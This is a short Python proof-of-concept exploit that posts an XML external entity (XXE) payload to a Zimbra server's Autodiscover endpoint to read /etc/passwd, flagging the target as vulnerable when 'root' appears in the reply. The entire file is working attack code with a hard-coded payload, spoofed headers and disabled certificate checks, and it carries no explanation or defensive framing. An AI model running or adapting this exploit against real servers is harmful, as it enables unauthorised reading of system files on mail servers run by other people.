#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = ddking

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def poc(url):
        url = url.rstrip("/")
        result = ''
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
        header["Content-Type"] = "application/xml"
        header["cookie"] = "ZM_TEST=true; ZM_LOGIN_CSRF=3d4a039e-0047-4828-aad1-326545bbb903"
        proxy = {"http":"http://127.0.0.1:8080"}
        xxe_poc = r"""
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
<Request>
<EMailAddress>aaaaa</EMailAddress>
<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
</Request>
</Autodiscover>
        """
        req = requests.post(url+"/Autodiscover/Autodiscover.xml",data=xxe_poc,headers=header,verify=False)
        if "root" in req.text:
                result = '[Zimbra XXE]   '+url
        else:
                result =False
        return result

